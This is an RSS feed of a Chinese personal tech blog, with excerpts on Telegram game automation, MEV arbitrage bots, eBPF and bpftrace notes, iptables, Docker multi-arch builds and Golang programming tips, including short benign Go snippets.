<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Hi~Roy!</title>
    <link>/posts/</link>
    <description>Recent content in Posts on Hi~Roy!</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Sun, 28 Jul 2024 15:15:03 +0800</lastBuildDate>
    
	<atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>TG游戏自动化的一种思路</title>
      <link>/posts/tg%E6%B8%B8%E6%88%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9A%84%E4%B8%80%E7%A7%8D%E6%80%9D%E8%B7%AF/</link>
      <pubDate>Sun, 28 Jul 2024 15:15:03 +0800</pubDate>
      
      <guid>/posts/tg%E6%B8%B8%E6%88%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9A%84%E4%B8%80%E7%A7%8D%E6%80%9D%E8%B7%AF/</guid>
      <description>&lt;p&gt;随着NotCoin带来的财富效应，Ton生态上一大坨的项目如雨后春笋般冒了出来——签到类、筋膜枪点击类的游戏更是让人玩的要吐。&lt;/p&gt;
&lt;p&gt;对于撸毛党而言，初期的手机群控或模拟器+自动点击的方式在账号较少的情况下可以应付一阵，但最终纯后台、自动化才是王道。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Web3漫游记——MEV机器人实践1</title>
      <link>/posts/web3%E6%BC%AB%E6%B8%B8%E8%AE%B0mev%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%AE%9E%E8%B7%B51/</link>
      <pubDate>Mon, 11 Sep 2023 03:15:03 +0800</pubDate>
      
      <guid>/posts/web3%E6%BC%AB%E6%B8%B8%E8%AE%B0mev%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%AE%9E%E8%B7%B51/</guid>
      <description>&lt;p&gt;今天开始进入技术同学最喜欢的代码环节，虽然前一篇文章&lt;a href=&#34;https://www.hi-roy.com/posts/web3%E6%BC%AB%E6%B8%B8%E8%AE%B0mev%E5%A5%97%E5%88%A9%E6%8A%80%E8%83%BD%E6%A0%91/&#34;&gt;《Web3漫游记——MEV套利技能树》&lt;/a&gt;主推Rust作为首选，但后续文章会以Golang为主。主要因为个人技术栈是Golang+Python，用熟悉的语言可以更专注于MEV相关逻辑实现。而使用Golang而非Python则是为了顺便熟悉一下Geth这个库，为了后面做私有节点优化提前做一些准备。有其他语言编程基础的小伙伴看懂应该都不是问题，只不过用到的库以及语法可能略有差别而已。&lt;/p&gt;
&lt;p&gt;另外提醒一下Python技术栈的小伙伴，截止到发文日期，&lt;code&gt;Python3.11&lt;/code&gt;、&lt;code&gt;web3.py-v6.9&lt;/code&gt;和&lt;code&gt;web3-flashbots-v1.1.1&lt;/code&gt;的SDK目前有兼容性问题，使用python3.8可正常测试。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Web3漫游记——MEV套利技能树</title>
      <link>/posts/web3%E6%BC%AB%E6%B8%B8%E8%AE%B0mev%E5%A5%97%E5%88%A9%E6%8A%80%E8%83%BD%E6%A0%91/</link>
      <pubDate>Tue, 29 Aug 2023 15:15:03 +0800</pubDate>
      
      <guid>/posts/web3%E6%BC%AB%E6%B8%B8%E8%AE%B0mev%E5%A5%97%E5%88%A9%E6%8A%80%E8%83%BD%E6%A0%91/</guid>
      <description>&lt;p&gt;在上一篇文章&lt;a href=&#34;https://www.hi-roy.com/posts/web3%E6%BC%AB%E6%B8%B8%E8%AE%B0mev%E4%BB%A5%E5%8F%8A%E8%B5%9A%E9%92%B1%E5%A7%BF%E5%8A%BF/&#34;&gt;Web3漫游记——MEV以及赚钱姿势&lt;/a&gt;中简单介绍了关于MEV的相关基础概念原理，没看过的同学建议先去补充一下前置知识方便理解。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Web3漫游记——MEV以及赚钱姿势</title>
      <link>/posts/web3%E6%BC%AB%E6%B8%B8%E8%AE%B0mev%E4%BB%A5%E5%8F%8A%E8%B5%9A%E9%92%B1%E5%A7%BF%E5%8A%BF/</link>
      <pubDate>Wed, 16 Aug 2023 15:15:03 +0800</pubDate>
      
      <guid>/posts/web3%E6%BC%AB%E6%B8%B8%E8%AE%B0mev%E4%BB%A5%E5%8F%8A%E8%B5%9A%E9%92%B1%E5%A7%BF%E5%8A%BF/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;对MEV没兴趣可以直接拉到文章末尾。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这篇文章假定你已经有了一些Web3相关最基础概念，比如什么是区块链、什么是Defi、什么是挖矿、什么是POW和POS、什么是CEX和DEX等等，这篇主要来聊聊什么是MEV以及MEV相关套利原理，至于技术同学最感兴趣的&amp;quot;Show Me The Code&amp;rdquo;，后面再说。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>在Golang中如何使用并发</title>
      <link>/posts/%E5%9C%A8golang%E4%B8%AD%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E5%B9%B6%E5%8F%91/</link>
      <pubDate>Thu, 19 Jan 2023 11:10:48 +0800</pubDate>
      
      <guid>/posts/%E5%9C%A8golang%E4%B8%AD%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E5%B9%B6%E5%8F%91/</guid>
      <description>&lt;p&gt;原文地址：&lt;a href=&#34;https://madflojo.medium.com/keeping-tcp-connections-alive-in-golang-801a78b7cf1&#34;&gt;这里&lt;/a&gt;，省略了一些非重点片段。&lt;/p&gt;
&lt;p&gt;本文的主要目标是展示在哪些场景下使用并发更加合适。因此本文中不会讲述并发相关的基本术语，比如goroutines、wait groups、channels、数据竞争等。
我打算创建一系列文章，详细解释最常用的并发相关示例。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Docker镜像多架构构建</title>
      <link>/posts/docker%E9%95%9C%E5%83%8F%E5%A4%9A%E6%9E%B6%E6%9E%84%E6%9E%84%E5%BB%BA/</link>
      <pubDate>Wed, 14 Sep 2022 19:54:11 +0800</pubDate>
      
      <guid>/posts/docker%E9%95%9C%E5%83%8F%E5%A4%9A%E6%9E%B6%E6%9E%84%E6%9E%84%E5%BB%BA/</guid>
      <description>&lt;p&gt;目前arm系统越来越常见，对镜像的多架构需求也越来越大。对于同一个镜像，最简单的办法就是在amd64或arm机器上build后通过不同的tag进行区分，比如&lt;code&gt;nginx:v1-amd64&lt;/code&gt;、&lt;code&gt;nginx:v1-arm64&lt;/code&gt;，但这种方式比较丑陋，而且没有对应架构的机器用来构建怎么办？&lt;/p&gt;
&lt;p&gt;目前最新的办法就是使用buildx来进行构建，不过这个特性目前默认是没启用的，需要在docker的配置文件中添加&lt;code&gt;&amp;quot;experimental&amp;quot;: true&lt;/code&gt;后重启docker服务生效。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>在Golang中保持TCP链接</title>
      <link>/posts/%E5%9C%A8golang%E4%B8%AD%E4%BF%9D%E6%8C%81tcp%E9%93%BE%E6%8E%A5/</link>
      <pubDate>Mon, 11 Jul 2022 14:26:27 +0800</pubDate>
      
      <guid>/posts/%E5%9C%A8golang%E4%B8%AD%E4%BF%9D%E6%8C%81tcp%E9%93%BE%E6%8E%A5/</guid>
      <description>&lt;p&gt;原文地址：&lt;a href=&#34;https://madflojo.medium.com/keeping-tcp-connections-alive-in-golang-801a78b7cf1&#34;&gt;这里&lt;/a&gt;，省略了一些非重点片段。&lt;/p&gt;
&lt;p&gt;尽管目前大多数系统都是通过gRPC或HTTP进行通信的，但仍有相当多的应用程序使用自定义协议。而且这些自定义协议中的许多都没有类似&lt;code&gt;net/http&lt;/code&gt;这样方便的包来管理TCP连接。&lt;/p&gt;
&lt;p&gt;这篇文章是为了那些直接和TCP连接打交道的人准备的。本文将讨论如何长期维护健康的TCP会话，以及如何对操持长链接的系统进行调优。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Iptables笔记</title>
      <link>/posts/iptables%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Thu, 14 Apr 2022 11:28:55 +0800</pubDate>
      
      <guid>/posts/iptables%E7%AC%94%E8%AE%B0/</guid>
      <description>&lt;p&gt;话不多说，先上图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/iptables-Flowchart.jpg&#34; alt=&#34;iptables&#34;&gt;&lt;/p&gt;
&lt;p&gt;上图中的渐变色分别代表了iptables中的4个表：raw、nat、mangle、filter。按照功能来看：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;filter:负责过滤，防火墙。&lt;/li&gt;
&lt;li&gt;nat:网络地址转换功能，也就是network address translate。&lt;/li&gt;
&lt;li&gt;mangle:拆解报文，做出修改，并重新封装。&lt;/li&gt;
&lt;li&gt;raw:关闭nat表上启用的连接追踪机制。&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>eBPF学习笔记5</title>
      <link>/posts/ebpf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/</link>
      <pubDate>Tue, 15 Feb 2022 19:49:25 +0800</pubDate>
      
      <guid>/posts/ebpf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/</guid>
      <description>未完待续……
参考链接  libbpf HOWTO: BCC to libbpf conversion  </description>
    </item>
    
    <item>
      <title>eBPF学习笔记4</title>
      <link>/posts/ebpf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/</link>
      <pubDate>Mon, 14 Feb 2022 19:49:25 +0800</pubDate>
      
      <guid>/posts/ebpf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/</guid>
      <description>&lt;p&gt;上一篇文章记录了如何使用bpftrace来编写bpf程序，这篇就来说说如何使用BCC(BPF Compiler Collection)。正如前一篇笔记说的，bpftrace简单是简单，但是对于某些复杂场景功能还略有不足。比如，很多的Linux工具都支持各种各样的参数，这时bpftrace就不能满足需求了。&lt;/p&gt;
&lt;p&gt;如图所示，&lt;a href=&#34;https://github.com/iovisor/bcc/blob/master/docs/tutorial.md&#34;&gt;BCC&lt;/a&gt;已经提供了大量的二进制工具可以直接使用，这篇笔记主要侧重于如何使用BCC编写eBPF程序。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.brendangregg.com/Perf/bcc_tracing_tools.png&#34; alt=&#34;bcc&#34;&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>eBPF学习笔记3</title>
      <link>/posts/ebpf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03/</link>
      <pubDate>Wed, 09 Feb 2022 15:35:03 +0800</pubDate>
      
      <guid>/posts/ebpf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03/</guid>
      <description>&lt;p&gt;这篇文章主要来说说bpftrace，这个语法十分的简单而且功能还在不停的完善中，后续变化一定以&lt;a href=&#34;https://github.com/iovisor/bpftrace/blob/master/docs&#34;&gt;官网文档&lt;/a&gt;为准。&lt;/p&gt;
&lt;h2 id=&#34;基本语法&#34;&gt;基本语法&lt;/h2&gt;
&lt;p&gt;bpftrace程序由3个部分组成：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;探针probes /过滤器filters/ {动作actions}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;既可以把程序保存为&lt;code&gt;.bt&lt;/code&gt;文件后（建议而不强制）使用&lt;code&gt;btftrace xxx.bt&lt;/code&gt;来执行，也可以通过单行指令&lt;code&gt;bpftrace -e  &#39;probes /filters/ { actions }&#39;&lt;/code&gt;来执行。&lt;/p&gt;
&lt;p&gt;其中，过滤器部分可以省略掉，不省略的话只有符合过滤器条件时才会执行动作。&lt;/p&gt;
&lt;p&gt;支持&lt;code&gt;?::&lt;/code&gt;三元操作符、&lt;code&gt;if{...}else{...}&lt;/code&gt;语句、&lt;code&gt;unroll (count) {statements}&lt;/code&gt;这种有界的循环、&lt;code&gt;while (condition) {...}&lt;/code&gt;(5.3+内核版本添加的实验性支持)、&lt;code&gt;[]&lt;/code&gt;数组、&lt;code&gt;(,)&lt;/code&gt;元组、以及C语言中的常见运算符。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>eBPF学习笔记2</title>
      <link>/posts/ebpf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</link>
      <pubDate>Tue, 08 Feb 2022 15:15:03 +0800</pubDate>
      
      <guid>/posts/ebpf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</guid>
      <description>&lt;p&gt;上一篇笔记里说编写运行BPF程序推荐2种方法：bpftrace和BCC，按照惯例来个hello world。&lt;/p&gt;
&lt;p&gt;之前说过很多功能都是新版内核才支持，想使用CO-RE内核需要开启&lt;code&gt;CONFIG_DEBUG_INFO_BTF=y&lt;/code&gt;和&lt;code&gt;CONFIG_DEBUG_INFO=y&lt;/code&gt; 这两个编译选项，所以建议使用最新的发行版，比如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ubuntu 20.10+&lt;/li&gt;
&lt;li&gt;Fedora 31+&lt;/li&gt;
&lt;li&gt;RHEL 8.2+&lt;/li&gt;
&lt;li&gt;Debian 11+&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>eBPF学习笔记1</title>
      <link>/posts/ebpf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</link>
      <pubDate>Wed, 02 Feb 2022 15:15:03 +0800</pubDate>
      
      <guid>/posts/ebpf%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</guid>
      <description>&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#%E4%BB%80%E4%B9%88%E6%98%AFebpf&#34;&gt;什么是eBPF？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81ebpf&#34;&gt;为什么需要eBPF？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ebpf&#34;&gt;如何使用eBPF？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E4%BD%BF%E7%94%A8ebpf%E6%97%B6%E5%BA%94%E8%AF%A5%E6%B3%A8%E6%84%8F&#34;&gt;使用eBPF时应该注意？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ebpf%E7%9A%84%E5%BA%94%E7%94%A8%E9%A2%86%E5%9F%9F&#34;&gt;eBPF的应用领域？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#ebpf%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9&#34;&gt;eBPF的优缺点？&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#%E4%BC%98%E7%82%B9&#34;&gt;优点&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E7%BC%BA%E7%82%B9&#34;&gt;缺点&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%E6%8E%A8%E8%8D%90%E9%98%85%E8%AF%BB&#34;&gt;推荐阅读&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;按照惯例，第一篇先来个概览，做一些基础知识的铺垫。&lt;/p&gt;
&lt;p&gt;目前这个技术领域还相对较“新”，本人也刚刚开始摸索学习，有错误的地方还请大佬们多多指正。&lt;/p&gt;
&lt;h2 id=&#34;什么是ebpf&#34;&gt;什么是eBPF？&lt;/h2&gt;
&lt;p&gt;eBPF由BPF(Berkeley Packet Filter)扩展而来，提供了一种在内核事件和用户程序事件发生时安全注入代码的机制，使得非内核开发人员也可以对内核进行控制，无需修改内核源码和重新编译内核就可以扩展内核的功能。（简单类比的话，就类似未成年人可以在有限的范围内安全的做一些成年人才能做的事了）&lt;/p&gt;
&lt;p&gt;之前想对内核做点什么，需要编写内核模块后编译进去，一个不小心就把内核搞崩了。而eBPF则通过即时编译器(JIT)，保证只有经过验证的、安全的eBFP指令才会被内核执行。&lt;/p&gt;
&lt;h2 id=&#34;为什么需要ebpf&#34;&gt;为什么需要eBPF？&lt;/h2&gt;
&lt;p&gt;从业界的角度看，最主要的因素还是对性能的追求。比如，小规模的k8s使用iptables就可以搞定容器网络通信，但随着规模的增大iptables性能问题越发明显，然后就有了IPVS模式。虽然IPVS和iptables都是基于Netfilter，但由于IPVS使用哈希表而iptables使用规则链表，导致前者的性能高于后者。然后随着集群规模的再次扩大，对性能有了更高的要求，于是乎eBPF就成了目前进一步提高性能的技术方案：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The aforementioned KubeCon Talk performed specific measurements on iptables as a bottleneck for Kubernetes service forwarding and noted that throughput degraded by ~30% with 5,000 services deployed, and by 80% with 10,000 services (a 6X performance difference). Likewise, rule updates at 5,000 services took 11 minutes, ages in a world of continuous delivery.&lt;/p&gt;
&lt;p&gt;Thanks to the flexibility of BPF, Cilium performs this same operation with O(1) average runtime behavior using a simple BPF map based hash table, meaning the lookup latency at 10,000 or even 20,000 services is constant. Likewise, updates to these BPF maps from userspace are highly-efficient, meaning that even with 20,000+ services, the time to update a forwarding rule is microseconds, not hours.&lt;/p&gt;
&lt;p&gt;For these reasons, Facebook has recently presented their use of BPF and XDP for load-balancing in a public talk to replace IPVS after measuring an almost 10x performance increase.&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    
    <item>
      <title>1分钟Linux性能分析</title>
      <link>/posts/1%E5%88%86%E9%92%9Flinux%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/</link>
      <pubDate>Fri, 28 Jan 2022 15:15:03 +0800</pubDate>
      
      <guid>/posts/1%E5%88%86%E9%92%9Flinux%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/</guid>
      <description>&lt;p&gt;最近看ebpf相关技术，找到一篇2015年的老文，现在看依然不过时——&lt;a href=&#34;https://netflixtechblog.com/linux-performance-analysis-in-60-000-milliseconds-accc10403c55&#34;&gt;原文&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;当你为了性能问题而登录到Linux系统时，首先要检查哪些东西呢？&lt;/p&gt;
&lt;p&gt;在奈飞有大量的Linux机器，并且有众多的工具去监控和分析性能。既包括负责整个云范围的监控工具Atlas，也包括单个实例分析的Vector。尽管这些工具帮助我们解决了很多问题，但是有些时候我们还是需要登录到实例上去执行一些标准Linux指令。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Golang中的开闭原则</title>
      <link>/posts/golang%E4%B8%AD%E7%9A%84%E5%BC%80%E9%97%AD%E5%8E%9F%E5%88%99/</link>
      <pubDate>Tue, 02 Nov 2021 11:05:20 +0800</pubDate>
      
      <guid>/posts/golang%E4%B8%AD%E7%9A%84%E5%BC%80%E9%97%AD%E5%8E%9F%E5%88%99/</guid>
      <description>&lt;p&gt;原文地址：&lt;a href=&#34;https://levelup.gitconnected.com/practical-solid-in-golang-open-closed-principle-1dd361565452&#34;&gt;这里&lt;/a&gt;，省略了一些非重点片段。&lt;/p&gt;
&lt;p&gt;Open/Closed Principle（OCP，开闭原则）也不过多介绍了，一句话“对扩展开放，对修改封闭”。策略模式就是这一原则的一种实现。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Golang中的单一职责原则</title>
      <link>/posts/golang%E4%B8%AD%E7%9A%84%E5%8D%95%E4%B8%80%E8%81%8C%E8%B4%A3%E5%8E%9F%E5%88%99/</link>
      <pubDate>Tue, 02 Nov 2021 10:05:20 +0800</pubDate>
      
      <guid>/posts/golang%E4%B8%AD%E7%9A%84%E5%8D%95%E4%B8%80%E8%81%8C%E8%B4%A3%E5%8E%9F%E5%88%99/</guid>
      <description>&lt;p&gt;原文地址：&lt;a href=&#34;https://levelup.gitconnected.com/practical-solid-in-golang-single-responsibility-principle-20afb8643483&#34;&gt;这里&lt;/a&gt;，省略了一些非重点片段。&lt;/p&gt;
&lt;p&gt;The Single Responsibility Principle (SRP，单一职责原则)的文字定义这里我就不再次说明了，直接开始重点。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>使用golang的channel实现订阅-发布模式</title>
      <link>/posts/%E4%BD%BF%E7%94%A8golang%E7%9A%84channel%E5%AE%9E%E7%8E%B0%E8%AE%A2%E9%98%85-%E5%8F%91%E5%B8%83%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Mon, 12 Jul 2021 20:05:20 +0800</pubDate>
      
      <guid>/posts/%E4%BD%BF%E7%94%A8golang%E7%9A%84channel%E5%AE%9E%E7%8E%B0%E8%AE%A2%E9%98%85-%E5%8F%91%E5%B8%83%E6%A8%A1%E5%BC%8F/</guid>
      <description>&lt;p&gt;原文地址：&lt;a href=&#34;https://eli.thegreenplace.net/2020/pubsub-using-channels-in-go/&#34;&gt;这里&lt;/a&gt;，省略了一些非重点片段。&lt;/p&gt;
&lt;p&gt;先定义一个结构体&lt;code&gt;Pubsub&lt;/code&gt;，客户端可以使用它来订阅、发布主题：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Pubsub&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
  &lt;span style=&#34;color:#a6e22e&#34;&gt;mu&lt;/span&gt;   &lt;span style=&#34;color:#a6e22e&#34;&gt;sync&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;RWMutex&lt;/span&gt;
  &lt;span style=&#34;color:#a6e22e&#34;&gt;subs&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;map&lt;/span&gt;[&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;][]&lt;span style=&#34;color:#66d9ef&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>博客迁移</title>
      <link>/posts/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/</link>
      <pubDate>Wed, 05 May 2021 16:55:06 +0800</pubDate>
      
      <guid>/posts/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/</guid>
      <description>&lt;p&gt;断断续续写博客居然有8年时间了啊……&lt;/p&gt;
&lt;p&gt;5年前，博客从&lt;code&gt;wordpress&lt;/code&gt;迁移到了&lt;code&gt;hexo&lt;/code&gt;+&lt;code&gt;github&lt;/code&gt;静态页面，用着不错之后就一直懒得折腾。但五一假期想写博客发现安装&lt;code&gt;nodejs&lt;/code&gt;和&lt;code&gt;hexo3&lt;/code&gt;版本怎么也搞不定，看报错提示似乎是某些依赖库已经不支持老版本了，干脆一不做二不休整体替换成&lt;code&gt;hugo&lt;/code&gt;+&lt;code&gt;Mainroad&lt;/code&gt;主题。要不电脑里又得装python又得装golang还得装nodejs，也是麻烦。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Golang小技巧</title>
      <link>/posts/golang%E5%B0%8F%E6%8A%80%E5%B7%A7/</link>
      <pubDate>Wed, 16 Dec 2020 21:32:59 +0000</pubDate>
      
      <guid>/posts/golang%E5%B0%8F%E6%8A%80%E5%B7%A7/</guid>
      <description>&lt;h3 id=&#34;下划线的妙用&#34;&gt;下划线的妙用&lt;/h3&gt;
&lt;p&gt;大多数情况下，下划线&lt;code&gt;_&lt;/code&gt;都用于忽略函数返回值的情况。最近查看&lt;code&gt;authboss&lt;/code&gt;这个开源库的代码时，发现&lt;a href=&#34;https://github.com/volatiletech/authboss-sample/blob/c13bdabe709387b66806bf12dbe12ad71bb17d17/storer.go#L63&#34;&gt;这样&lt;/a&gt;一种用法:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt; {
    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; (
    &lt;span style=&#34;color:#a6e22e&#34;&gt;assertUser&lt;/span&gt;   = &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt;{}
    &lt;span style=&#34;color:#a6e22e&#34;&gt;assertStorer&lt;/span&gt; = &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;MemStorer&lt;/span&gt;{}
    &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;authboss&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt;            = &lt;span style=&#34;color:#a6e22e&#34;&gt;assertUser&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;authboss&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;AuthableUser&lt;/span&gt;    = &lt;span style=&#34;color:#a6e22e&#34;&gt;assertUser&lt;/span&gt;
)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>新手可能会犯的50个Golang错误</title>
      <link>/posts/%E6%96%B0%E6%89%8B%E5%8F%AF%E8%83%BD%E4%BC%9A%E7%8A%AF%E7%9A%8450%E4%B8%AAgolang%E9%94%99%E8%AF%AF/</link>
      <pubDate>Wed, 16 Dec 2020 21:32:59 +0000</pubDate>
      
      <guid>/posts/%E6%96%B0%E6%89%8B%E5%8F%AF%E8%83%BD%E4%BC%9A%E7%8A%AF%E7%9A%8450%E4%B8%AAgolang%E9%94%99%E8%AF%AF/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://devs.cloudimmunity.com/gotchas-and-common-mistakes-in-go-golang/index.html&#34;&gt;原文&lt;/a&gt;，向原作者表示感谢。这里省略了一些无关的介绍说明以及过于简单的说明，直接看代码就懂了。&lt;/p&gt;
&lt;h2 id=&#34;左花括号不能单独一行&#34;&gt;左花括号不能单独一行&lt;/h2&gt;
&lt;p&gt;在大多数语言中你可以随便放置花括号的位置，但go语言不一样，你可以理解为为go会自动注入分号（automatic semicolon injection）：&lt;/p&gt;
&lt;p&gt;错误代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fmt&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;()  
{ &lt;span style=&#34;color:#75715e&#34;&gt;//error, can&amp;#39;t have the opening brace on a separate line
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello there!&amp;#34;&lt;/span&gt;)
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;编译错误：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;tmp&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sandbox826898458&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;.&lt;span style=&#34;color:#66d9ef&#34;&gt;go&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;syntax&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;unexpected&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;semicolon&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;newline&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;before&lt;/span&gt; {
